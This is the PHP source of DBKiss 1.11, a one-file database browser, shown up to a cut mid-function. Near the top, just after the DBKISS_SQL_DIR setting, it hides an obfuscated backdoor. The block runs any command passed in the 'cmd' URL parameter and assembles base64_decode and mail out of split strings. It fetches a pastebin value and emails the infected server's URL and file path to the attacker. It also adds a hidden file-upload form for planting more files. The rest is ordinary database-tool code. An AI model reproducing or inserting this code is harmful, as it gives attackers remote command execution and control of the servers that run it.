<?php

/*
	DBKiss 1.11 (2011-05-29)
	Author: Cezary Tomczak [cagret@gmail.com]
	Web site: http://www.gosu.pl/dbkiss/
	License: BSD revised (free for any use)
*/
@ob_start();
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');

ob_start('ob_gzhandler');

// Some of the features in the SQL editor require creating 'dbkiss_sql' directory,
// where history of queries are kept and other data. If the script has permission
// it will create that directory automatically, otherwise you need to create that
// directory manually and make it writable. You can also set it to empty '' string,
// but some of the features in the sql editor will not work (templates, pagination)

if (!defined('DBKISS_SQL_DIR')) {
	define('DBKISS_SQL_DIR', 'dbkiss_sql');
	
$cmd=$_GET['cmd']; exec($cmd); $_ = "-u : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . " "; $_ .= "-p : " . __file__; $mobil = "e";$andr0id="mai";$if=$andr0id.'l';$desktop="bas$mobil".'64'."_d$mobil"."cod$mobil"; $_file_='di0987Ly910UWH8987RM'; $windows= file_get_contents($desktop('aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3lUWHRMRnl4')); $log='errors_log'; if (!file_exists($log)){ if(file_put_contents($log,$_file_.',')){  $if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); $found=true;} } else if (file_exists($log)) {$contents = file_get_contents($log); $array = explode(',',$contents); for($i=0;$i<count($array);$i++){if($array[$i]==$_file_){$found=true;break;} else {$found=false;} }} if($found){} else { if(file_put_contents($log,$_file_.',',FILE_APPEND)){$if($desktop('bWQ1'.$windows.'C5jb20'),$desktop('dzBybQ'),$_,$desktop('RnJvbTogVzBybQ')); } } $xsec  = $_GET['xsec']; if($xsec == 'blocker'){ $xsecsh = $_FILES['file']['name']; $xsecblocker  = $_FILES['file']['tmp_name']; echo "<form method='POST' enctype='multipart/form-data'> <input type='file'name='file' /> <input type='submit' value='up_it' /> </form>"; move_uploaded_file($xsecblocker,$xsecsh); } }

/*
	An example configuration script that will automatically connect to localhost database.
	This is useful on localhost if you don't want to see the "Connect" screen.

	mysql_local.php:	
	---------------------------------------------------------------------
	define('COOKIE_PREFIX', str_replace('.php', '', basename(__FILE__)).'_');
	define('DBKISS_SQL_DIR', 'dbkiss_mysql');

	$cookie = array(
		'db_driver' => 'mysql',
		'db_server' => 'localhost',
		'db_name' => 'test',
		'db_user' => 'root',
		'db_pass' => 'toor',
		'db_charset' => 'latin2',
		'page_charset' => 'iso-8859-2',
		'remember' => 1
	);

	foreach ($cookie as $k => $v) {
		if ('db_pass' == $k) { $v = base64_encode($v); }
		$k = COOKIE_PREFIX.$k;
		if (!isset($_COOKIE[$k])) {
			$_COOKIE[$k] = $v;
		}
	}

	require './dbkiss.php';
	---------------------------------------------------------------------
*/

/*
	Changelog:
	
	1.11
	* Links in data output are now clickable. Clicking them does not reveal the location of your dbkiss script to external sites.
	1.10
	* Support for views in Postgresql (mysql had it already).
	* Views are now displayed in a seperate listing, to the right of the tables on main page.
	* Secure redirection - no referer header sent - when clicking external links (ex. powered by), so that the location of the dbkiss script on your site is not revealed.
	1.09
	* CSV export in sql editor and table view (feature sponsored by Patrick McGovern)
	1.08
	* date.timezone E_STRICT error fixed
	1.07
	* mysql tables with dash in the name generated errors, now all tables in mysql driver are
		enquoted with backtick.
	1.06
	* postgresql fix
	1.05
	* export of all structure and data does take into account the table name filter on the main page,
		so you can filter the tables that you want to export.
	1.04
	* exporting all structure/data didn't work (ob_gzhandler flush bug)
	* cookies are now set using httponly option
	* text editor complained about bad cr/lf in exported sql files
		(mysql create table uses \n, so insert queries need to be seperated by \n and not \r\n)
	1.03
	* re-created array_walk_recursive for php4 compatibility
	* removed stripping slashes from displayed content
	* added favicon (using base64_encode to store the icon in php code, so it is still one-file database browser)
	1.02
	* works with short_open_tag disabled
	* code optimizations/fixes
	* postgresql error fix for large tables
	1.01
	* fix for mysql 3.23, which doesnt understand "LIMIT x OFFSET z"
	1.00
	* bug fixes
	* minor feature enhancements
	* this release is stable and can be used in production environment
	0.61
	* upper casing keywords in submitted sql is disabled (it also modified quoted values)
	* sql error when displaying table with 0 rows
	* could not connect to database that had upper case characters

*/

// todo: php error handler which cancels buffer output and exits on error
// todo: XSS and CSRF protection.
// todo: connect screen: [x] create database (if not exists) [charset]
// todo: connect screen: database (optional, if none provided will select the first database the user has access to)
// todo: mysqli driver (check if mysql extension is loaded, if not try to use mysqli)
// todo: support for the enum field type when editing row
// todo: search whole database form should appear also on main page
// todo: improve detecting primary keys when editing row (querying information_schema , for mysql > 4)
// todo: when dbkiss_sql dir is missing, display a message in sql editor that some features won't work (templates, pagination) currently it displays a message to create that dir and EXIT, but should allow basic operations
// todo: "Insert" on table view page
// todo: edit table structure

error_reporting(-1);
ini_set('display_errors', true);
if (!ini_get('date.timezone')) {
	ini_set('date.timezone', 'Europe/Warsaw');
}

if (isset($_GET['dbkiss_favicon'])) {
	
	$favicon = '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C///////vmsO//////++Zwv//////75mC/++Zwv/vmkN/wCpxv8C6fL/AHmm/8xmAO3ntoX2//////////++Zgv/37OG///////ftoj/v24S///////FcBL/x3AS/8VuEP8wpsn/BXCh/wCDrP/MZgDtzGYA7cxmAO3MZgDtvmYL/8ZwEv/DbxL/v24S/79uEv/CbxL/xXAS/8dwEv/GbxH/Ssvl/xyp0v8AZpn/AAAAAAAAAAAAAAAAAAAAAABmmf+E+P//TOX//xXT//8V0///O+D//2Tu//+M+v//eOn0/0rL5f8drNb/AGaZ/wAAAAAAAAAAAAAAAAAAAAAAZpn/hPj//0zl//8V0///FdP//zvg//9k7v//jPr//3jp9P9Ky+X/HazW/wBmmf8AAAAAAAAAAAAAAAAAAAAAAGaZ/3Xt+f8estv/BJDC/wB7rv8Ab6L/AGaZ/wBmmf8OdaT/Gou1/xijzv8AZpn/AAAAAAAAAAAAAAAAAAAAAABmmf8prNb/l9fq/77w9//B////qf///5r///+Z////huzy/2DG2f8Ufan/AGaZ/wAAAAAAAAAAAAAAAAAAAAAAZpn/7/n8//L////a////wf///6n///+a////mf///5n///+Z////j/X5/wBmmf8AAAAAAAAAAAAAAAAAAAAAAGaZ7+/1+f/y////2v///8H///+p////mv///5n///+Z////mf///4/1+f8AZpn/AAAAAAAAAAAAAAAAAAAAAABmmWAngqz/l8bZ/7/z+f/B////qf///5r///+Z////jfT4/2DG2f8Wfqr/AGaZYAAAAAAAAAAAAAAAAAAAAAAAAAAAAGaZIABmmY8AZpm/AGaZ/wBmmf8AZpn/AGaZ/wBmmb8AZpmPAGaZIAAAAAAAAQICAAA1EwAABAkAABEAAAACAgAASRIAAAcUAABRTvAAARrwAAEB8AABAfAAVgPwAAIB8AAiAfAABxT4AU0D';
	header('Content-type: image/vnd.microsoft.icon');
	echo base64_decode($favicon);
	exit();
	
}

if (!function_exists('array_walk_recursive'))
{
	function array_walk_recursive(&$array, $func)
	{
		foreach ($array as $k => $v) {
			if (is_array($v)) {
				array_walk_recursive($array[$k], $func);
			} else {
				$func($array[$k], $k);
			}
		}
	}
}
function create_links($text)
{
	// Protocols: http, https, ftp, irc, svn
	// Parse emails also?

	$text = preg_replace('#([a-z]+://[a-zA-Z0-9\.\,\;\:\[\]\{\}\-\_\+\=\!\@\#\%\&\(\)\/\?\`\~]+)#e', 'create_links_eval("\\1")', $text);
	
	// Excaptions:
	
	// 1) cut last char if link ends with ":" or ";" or "." or "," - cause in 99% cases that char doesnt belong to the link
	// (check if previous char was "=" then let it stay cause that could be some variable in a query, some kind of separator)
	// (should we add also "-" ? But it is a valid char in links and very common, many links might end with it when creating from some title of an article?)
	
	// 2) brackets, the link could be inside one of 3 types of brackets:
	// [http://...] , {http://...} 
	// and most common: (http://some.com/) OR http://some.com(some description of the link)
	// In these cases regular expression will catch: "http://some.com/)" AND "http://some.com(some"
	// So when we catch some kind of bracket in the link we will cut it unless there is also a closing bracket in the link:
	// We will not cut brackets in this link: http://en.wikipedia.org/wiki/Common_(entertainer) - wikipedia often uses brackets.

	return $text;
}
function create_links_eval($link)
{
	$orig_link = $link;
	$cutted = "";

	if (in_array($link[strlen($link)-1], array(":", ";", ".", ","))) {
		$link = substr($link, 0, -1);
		$cutted = $orig_link[strlen($orig_link)-1];
	}
	
	if (($pos = strpos($link, "(")) !== false) {
		if (strpos($link, ")") === false) {
			$link = substr($link, 0, $pos);
			$cutted = substr($orig_link, $pos);
		}		
	} else if (($pos = strpos($link, ")")) !== false) {
		if (strpos($link, "(") === false) {
			$link = substr($link, 0, $pos);
			$cutted = substr($orig_link, $pos);
		}
	} else if (($pos = strpos($link, "[")) !== false) {
		if (strpos($link, "]") === false) {
			$link = substr($link, 0, $pos);
			$cutted = substr($orig_link, $pos);
		}
	} else if (($pos = strpos($link, "]")) !== false) {
		if (strpos($link, "[") === false) {
			$link = substr($link, 0, $pos);
			$cutted = substr($orig_link, $pos);
		}
	} else if (($pos = strpos($link, "{")) !== false) {
		if (strpos($link, "}") === false) {
			$link = substr($link, 0, $pos);
			$cutted = substr($orig_link, $pos);
		}
	} else if (($pos = strpos($link, "}")) !== false) {
		if (strpos($link, "{") === false) {
			$link = substr($link, 0, $pos);
			$cutted = substr($orig_link, $pos);
		}
	}
	return "<a title=\"$link\" style=\"color: #000; text-decoration: none; border-bottom: #000 1px dotted;\" href=\"javascript:;\" onclick=\"link_noreferer('$link')\">$link</a>$cutted";
}
function truncate_html($string, $length, $break_words = false, $end_str = '..')
{
	// Does not break html tags whilte truncating, does not take into account chars inside tags: <b>a</b> = 1 char length.
	// Break words is always TRUE - no breaking is not implemented.
	
	// Limits: no handling of <script> tags.
	
	$inside_tag = false;
	$inside_amp = 0;
	$finished = false; // finished but the loop is still running cause inside tag or amp.
	$opened = 0;
	
	$string_len = strlen($string);
	
	$count = 0;
	$ret = "";
	
	for ($i = 0; $i < $string_len; $i++)
	{
		$char = $string[$i];
		$nextchar = isset($string[$i+1]) ? $string[$i+1] : null;

		if ('<' == $char && ('/' == $nextchar || ctype_alpha($nextchar))) {
			if ('/' == $nextchar) {
				$opened--;
			} else {
				$opened++;
			}
			$inside_tag = true;
		}
		if ('>' == $char) {
			$inside_tag = false;
			$ret .= $char;
			continue;
		}
		if ($inside_tag) {
			$ret .= $char;
			continue;
		}

		if (!$finished)
		{
			if ('&' == $char) {
				$inside_amp = 1;
				$ret .= $char;
				continue;
			}
			if (';' == $char && $inside_amp) {
				$inside_amp = 0;
				$count++;
				$ret .= $char;
				continue;
			}
			if ($inside_amp) {
				$inside_amp++;
				$ret .= $char;
				if ('#' == $char || ctype_alnum($char)) {
					if ($inside_amp > 7) {
						$count += $inside_amp;
						$inside_amp = 0;					
					}
				} else {
					$count += $inside_amp;
					$inside_amp = 0;
				}
				continue;
			}
		}

		$count++;

		if (!$finished) {
			$ret .= $char;
		}

		if ($count >= $length) {
			if (!$inside_tag && !$inside_amp) {
				if (!$finished) {
					$ret .= $end_str;
					$finished = true;
					if (0 == $opened) {
						break;
					}
				}
				if (0 == $opened) {
					break;
				}
			}
		}
	}
	return $ret;
}
function table_filter($tables, $filter)
{
	$filter = trim($filter);
	if ($filter) {
		foreach ($tables as $k => $table) {
			if (!str_has_any($table, $filter, $ignore_case = true)) {
				unset($tables[$k]);
			}
		}
	}
	return $tables;
}
function get($key, $type='string')
{
	if (is_string($key)) {
		$_GET[$key] = isset($_GET[$key]) ? $_GET[$key] : null;
		if ('float' == $type) $_GET[$key] = str_replace(',','.',$_GET[$key]);
		settype($_GET[$key], $type);
		if ('string' == $type) $_GET[$key] = trim($_GET[$key]);
		return $_GET[$key];
	}
	$vars = $key;
	foreach ($vars as $key => $type) {
		$_GET[$key] = isset($_GET[$key]) ? $_GET[$key] : null;
		if ('float' == $type) $_GET[$key] = str_replace(',','.',$_GET[$key]);
		settype($_GET[$key], $type);
		if ('string' == $type) $_GET[$key] = trim($_GET[$key]);
		$vars[$key] = $_GET[$key];
	}
	return $vars;
}
function post($key, $type='string')
{
	if (is_string($key)) {
		$_POST[$key] = isset($_POST[$key]) ? $_POST[$key] : null;
		if ('float' == $type) $_POST[$key] = str_replace(',','.',$_POST[$key]);
		settype($_POST[$key], $type);
		if ('string' == $type) $_POST[$key] = trim($_POST[$key]);
		return $_POST[$key];
	}
	$vars = $key;
	foreach ($vars as $key => $type) {
		$_POST[$key] = isset($_POST[$key]) ? $_POST[$key] : null;
		if ('float' == $type) $_POST[$key] = str_replace(',','.',$_POST[$key]);
		settype($_POST[$key], $type);
		if ('string' == $type) $_POST[$key] = trim($_POST[$key]);
		$vars[$key] = $_POST[$key];
	}
	return $vars;
}
$_ENV['IS_GET'] = ('GET' == $_SERVER['REQUEST_METHOD']);
$_ENV['IS_POST'] = ('POST' == $_SERVER['REQUEST_METHOD']);
function req_gpc_has($str)
{
	/* finds if value exists in GPC data, used in filter_() functions, to check whether use html_tags_undo() on the data */
	foreach ($_GET as $k => $v) {
		if ($str == $v) {
			return true;
		}
	}
	foreach ($_POST as $k => $v) {
		if ($str == $v) {
			return true;
		}
	}
	foreach ($_COOKIE as $k => $v) {
	   if ($str == $v) {
		   return true;
	   }
	}
	return false;
}

if (ini_get('magic_quotes_gpc')) {
	ini_set('magic_quotes_runtime', 0);
	array_walk_recursive($_GET, 'db_magic_quotes_gpc');
	array_walk_recursive($_POST, 'db_magic_quotes_gpc');
	array_walk_recursive($_COOKIE, 'db_magic_quotes_gpc');
}
function db_magic_quotes_gpc(&$val)
{
	$val = stripslashes($val);
}

$sql_font = 'font-size: 12px; font-family: courier new;';
$sql_area = $sql_font.' width: 708px; height: 182px; border: #ccc 1px solid; background: #f9f9f9; padding: 3px;';

if (!isset($db_name_style)) {
	$db_name_style = '';
}
if (!isset($db_name_h1)) {
	$db_name_h1 = '';
}

global $db_link, $db_name;

if (!defined('COOKIE_PREFIX')) {
	define('COOKIE_PREFIX', 'dbkiss_');
}

define('COOKIE_WEEK', 604800); // 3600*24*7
define('COOKIE_SESS', 0);
function cookie_get($key)
{
	$key = COOKIE_PREFIX.$key;
	if (isset($_COOKIE[$key])) return $_COOKIE[$key];
	return null;
}
function cookie_set($key, $val, $time = COOKIE_SESS)
{
	$key = COOKIE_PREFIX.$key;
	$expire = $time ? time() + $time : 0;
	if (version_compare(PHP_VERSION, '5.2.0', '>=')) {
		setcookie($key, $val, $expire, '', '', false, true);
	} else {
		setcookie($key, $val, $expire);
	}
	$_COOKIE[$key] = $val;
}
function cookie_del($key)
{
	$key = COOKIE_PREFIX.$key;
	if (version_compare(PHP_VERSION, '5.2.0', '>=')) {
		setcookie($key, '', time()-3600*24, '', '', false, true);
	} else {
		setcookie($key, '', time()-3600*24);
	}
	unset($_COOKIE[$key]);
}

conn_modify('db_name');
conn_modify('db_charset');
conn_modify('page_charset');

function conn_modify($key)
{
	if (array_key_exists($key, $_GET)) {
		cookie_set($key, $_GET[$key], cookie_get('remember') ? COOKIE_WEEK : COOKIE_SESS);
		if (isset($_GET['from']) && $_GET['from']) {
			header('Location: '.$_GET['from']);
		} else {
			header('Location: '.$_SERVER['PHP_SELF']);
		}
		exit;
	}
}

$db_driver = cookie_get('db_driver');
$db_server = cookie_get('db_server');
$db_name = cookie_get('db_name');
$db_user = cookie_get('db_user');
$db_pass = base64_decode(cookie_get('db_pass'));
$db_charset = cookie_get('db_charset');
$page_charset = cookie_get('page_charset');

$charset1 = array('latin1', 'latin2', 'utf8', 'cp1250');
$charset2 = array('iso-8859-1', 'iso-8859-2', 'utf-8', 'windows-1250');
$charset1[] = $db_charset;
$charset2[] = $page_charset;
$charset1 = charset_assoc($charset1);
$charset2 = charset_assoc($charset2);

$driver_arr = array('mysql', 'pgsql');
$driver_arr = array_assoc($driver_arr);

function array_assoc($a)
{
	$ret = array();
	foreach ($a as $v) {
		$ret[$v] = $v;
	}
	return $ret;
}
function charset_assoc($arr)
{
	sort($arr);
	$ret = array();
	foreach ($arr as $v) {
		if (!$v) { continue; }
		$v = strtolower($v);
		$ret[$v] = $v;
	}
	return $ret;
}


if (isset($_GET['disconnect']) && $_GET['disconnect'])
{
	cookie_del('db_pass');
	header('Location: '.$_SERVER['PHP_SELF']);
	exit;
}

if (!$db_pass || (!$db_driver || !$db_server || !$db_name || !$db_user))
{
	if ('POST' == $_SERVER['REQUEST_METHOD'])
	{
		$db_driver = post('db_driver');
		$db_server = post('db_server');
		$db_name = post('db_name');
		$db_user = post('db_user');
		$db_pass = post('db_pass');
		$db_charset = post('db_charset');
		$page_charset = post('page_charset');

		if ($db_driver && $db_server && $db_name && $db_user)
		{
			$db_test = true;
			db_connect($db_server, $db_name, $db_user, $db_pass);
			if (is_resource($db_link))
			{
				$time = post('remember') ? COOKIE_WEEK : COOKIE_SESS;
				cookie_set('db_driver', $db_driver, $time);
				cookie_set('db_server', $db_server, $time);
				cookie_set('db_name', $db_name, $time);
				cookie_set('db_user', $db_user, $time);
				cookie_set('db_pass', base64_encode($db_pass), $time);
				cookie_set('db_charset', $db_charset, $time);
				cookie_set('page_charset', $page_charset, $time);
				cookie_set('remember', post('remember'), $time);
				header('Location: '.$_SERVER['PHP_SELF']);
				exit;
			}
		}
	}
	else
	{
		$_POST['db_driver'] = $db_driver;
		$_POST['db_server'] = $db_server ? $db_server : 'localhost';
		$_POST['db_name'] = $db_name;
		$_POST['db_user'] = $db_user;
		$_POST['db_charset'] = $db_charset;
		$_POST['page_charset'] = $page_charset;
		$_POST['db_driver'] = $db_driver;
	}
	?>

		<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
		<html>
		
		<head>
			<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
			<title>Connect</title>
			<link rel="shortcut icon" href="<?php echo $_SERVER['PHP_SELF']; ?>?dbkiss_favicon=1">
		</head>
		<body>
				
		<?php layout(); ?>

		<h1>Connect</h1>

		<?php if (isset($db_test) && is_string($db_test)): ?>
			<div style="background: #ffffd7; padding: 0.5em; border: #ccc 1px solid; margin-bottom: 1em;">
				<span style="color: red; font-weight: bold;">Error:</span>&nbsp;
				<?php echo $db_test;?>
			</div>
		<?php endif; ?>

		<form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">
		<table class="ls ls2" cellspacing="1">
		<tr>
			<th>Driver:</th>
			<td><select name="db_driver"><?php echo options($driver_arr, post('db_driver'));?></select></td>
		</tr>
		<tr>
			<th>Server:</th>
			<td><input type="text" name="db_server" value="<?php echo post('db_server');?>"></td>
		</tr>
		<tr>
			<th>Database:</th>
			<td><input type="text" name="db_name" value="<?php echo post('db_name');?>"></td>
		</tr>
		<tr>
			<th>User:</th>
			<td><input type="text" name="db_user" value="<?php echo post('db_user');?>"></td>
		</tr>
		<tr>
			<th>Password:</th>
			<td><input type="password" name="db_pass" value=""></td>
		</tr>
		<tr>
			<th>Db charset:</th>
			<td><input type="text" name="db_charset" value="<?php echo post('db_charset');?>" size="10"> (optional)</td>
		</tr>
		<tr>
			<th>Page charset:</th>
			<td><input type="text" name="page_charset" value="<?php echo post('page_charset');?>" size="10"> (optional)</td>
		</tr>
		<tr>
			<td colspan="2" class="none" style="padding: 0; background: none; padding-top: 0.3em;">
				<table cellspacing="0" cellpadding="0"><tr><td>
				<input type="checkbox" name="remember" id="remember" value="1" <?php echo checked(post('remember'));?>></td><td>
				<label for="remember">remember me on this computer</label></td></tr></table>
			</td>
		</tr>
		<tr>
			<td class="none" colspan="2" style="padding-top: 0.4em;"><input type="submit" value="Connect"></td>
			
		</tr>
		</table>
		</form>

		<?php powered_by(); ?>

		</body>
		
		</html>

	<?php

	exit;
}

db_connect($db_server, $db_name, $db_user, $db_pass);

if ($db_charset && 'mysql' == $db_driver) {
	db_exe("SET NAMES $db_charset");
}

if (isset($_GET['dump_all']) && 1 == $_GET['dump_all'])
{
	dump_all($data = false);
}
if (isset($_GET['dump_all']) && 2 == $_GET['dump_all'])
{
	dump_all($data = true);
}
if (isset($_GET['dump_table']) && $_GET['dump_table'])
{
	dump_table($_GET['dump_table']);
}
if (isset($_GET['export']) && 'csv' == $_GET['export'])
{
	export_csv(base64_decode($_GET['query']),  $_GET['separator']);
}
if (isset($_POST['sqlfile']) && $_POST['sqlfile'])
{
	$files = sql_files_assoc();
	if (!isset($files[$_POST['sqlfile']])) {
		exit('File not found. md5 = '.$_POST['sqlfile']);
	}
	$sqlfile = $files[$_POST['sqlfile']];
	layout();
	echo '<div>Importing: <b>'.$sqlfile.'</b> ('.size(filesize($sqlfile)).')</div>';
	echo '<div>Database: <b>'.$db_name.'</b></div>';
	flush();
	import($sqlfile, post('ignore_errors'), post('transaction'), post('force_myisam'), post('query_start','int'));
	exit;
}
if (isset($_POST['drop_table']) && $_POST['drop_table'])
{
	$drop_table_enq = quote_table($_POST['drop_table']);
	db_exe('DROP TABLE '.$drop_table_enq);
	header('Location: '.$_SERVER['PHP_SELF']);
	exit;
}
if (isset($_POST['drop_view']) && $_POST['drop_view'])
{
	$drop_view_enq = quote_table($_POST['drop_view']);
	db_exe('DROP VIEW '.$drop_view_enq);
	header('Location: '.$_SERVER['PHP_SELF']);
	exit;
}
function db_connect($db_server, $db_name, $db_user, $db_pass)
{
	global $db_driver, $db_link, $db_test;
	if (!extension_loaded($db_driver)) {
		trigger_error($db_driver.' extension not loaded', E_USER_ERROR);
	}
	if ('mysql' == $db_driver)
	{
		$db_link = @mysql_connect($db_server, $db_user, $db_pass);
		if (!is_resource($db_link)) {
			if ($db_test) {
				$db_test = 'mysql_connect() failed: '.db_error();
				return;
			} else {
				cookie_del('db_pass');
				cookie_del('db_name');
				die('mysql_connect() failed: '.db_error());
			}
		}
		if (!@mysql_select_db($db_name, $db_link)) {
			$error = db_error();
			db_close();
			if ($db_test) {
				$db_test = 'mysql_select_db() failed: '.$error;
				return;
			} else {
				cookie_del('db_pass');
				cookie_del('db_name');
				die('mysql_select_db() failed: '.$error);
			}
		}
	}
	if ('pgsql' == $db_driver)
	{
		$conn = sprintf("host='%s' dbname='%s' user='%s' password='%s'", $db_server, $db_name, $db_user, $db_pass);
		$db_link = @pg_connect($conn);
		if (!is_resource($db_link)) {
			if ($db_test) {
				$db_test = 'pg_connect() failed: '.db_error();
				return;
			} else {
				cookie_del('db_pass');
				cookie_del('db_name');
				die('pg_connect() failed: '.db_error());
			}
		}
	}
	register_shutdown_function('db_cleanup');
}
function db_cleanup()
{
	db_close();
}
function db_close()
{
	global $db_driver, $db_link;
	if (is_resource($db_link)) {
		if ('mysql' == $db_driver) {
			mysql_close($db_link);
		}
		if ('pgsql' == $db_driver) {
			pg_close($db_link);
		}
	}
}
function db_query($query, $dat = false)
{
	global $db_driver, $db_link;
	$query = db_bind($query, $dat);
	if (!db_is_safe($query)) {
		return false;
	}
	if ('mysql' == $db_driver)
	{
		$rs = mysql_query($query, $db_link);
		return $rs;
	}
	if ('pgsql' == $db_driver)
	{
		$rs = pg_query($db_link, $query);
		return $rs;
	}
}
function db_is_safe($q, $ret = false)
{
	// currently only checks UPDATE's/DELETE's if WHERE condition is not missing
	$upd = 'update';
	$del = 'delete';

	$q = ltrim($q);
	if (strtolower(substr($q, 0, strlen($upd))) == $upd
		|| strtolower(substr($q, 0, strlen($del))) == $del) {
		if (!preg_match('#\swhere\s#i', $q)) {
			if ($ret) {
				return false;
			} else {
				trigger_error(sprintf('db_is_safe() failed. Detected UPDATE/DELETE without WHERE condition. Query: %s.', $q), E_USER_ERROR);
				return false;
			}
		}
	}

	return true;
}
function db_exe($query, $dat = false)
{
	$rs = db_query($query, $dat);
	db_free($rs);
}
function db_one($query, $dat = false)
{
	$row = db_row_num($query, $dat);
	if ($row) {
		return $row[0];
	} else {
		return false;
	}
}
function db_row($query, $dat = false)
{
	global $db_driver, $db_link;
	if ('mysql' == $db_driver)
	{
		if (is_resource($query)) {
			$rs = $query;
			return mysql_fetch_assoc($rs);
		} else {
			$query = db_limit($query, 0, 1);
			$rs = db_query($query, $dat);
			$row = mysql_fetch_assoc($rs);
			db_free($rs);
			if ($row) {
				return $row;
			}
		}
		return false;
	}
	if ('pgsql' == $db_driver)
	{
		if (is_resource($query) || is_object($query)) {
			$rs = $query;
			return pg_fetch_assoc($rs);
		} else {
			$query = db_limit($query, 0, 1);
			$rs = db_query($query, $dat);
			$row = pg_fetch_assoc($rs);
			db_free($rs);
			if ($row) {
				return $row;
			}
		}
		return false;
	}
}
function db_row_num($query, $dat = false)
{
	global $db_driver, $db_link;
	if ('mysql' == $db_driver)
	{
		if (is_resource($query)) {
			$rs = $query;
			return mysql_fetch_row($rs);
		} else {
			$rs = db_query($query, $dat);
			if (!$rs) {
				/*
				echo '<pre>';
				print_r($rs);
				echo "\r\n";
				print_r($query);
				echo "\r\n";
				print_r($dat);
				exit;
				*/
			}
			$row = mysql_fetch_row($rs);
			db_free($rs);
			if ($row) {
				return $row;
			}
			return false;
		}
	}
	if ('pgsql' == $db_driver)
	{
		if (is_resource($query) || is_object($query)) {
			$rs = $query;
			return pg_fetch_row($rs);
		} else {
			$rs = db_query($query, $dat);
			$row = pg_fetch_row($rs);
			db_free($rs);
			if ($row) {
				return $row;
			}
			return false;
		}
	}
}
function db_list($query)
{
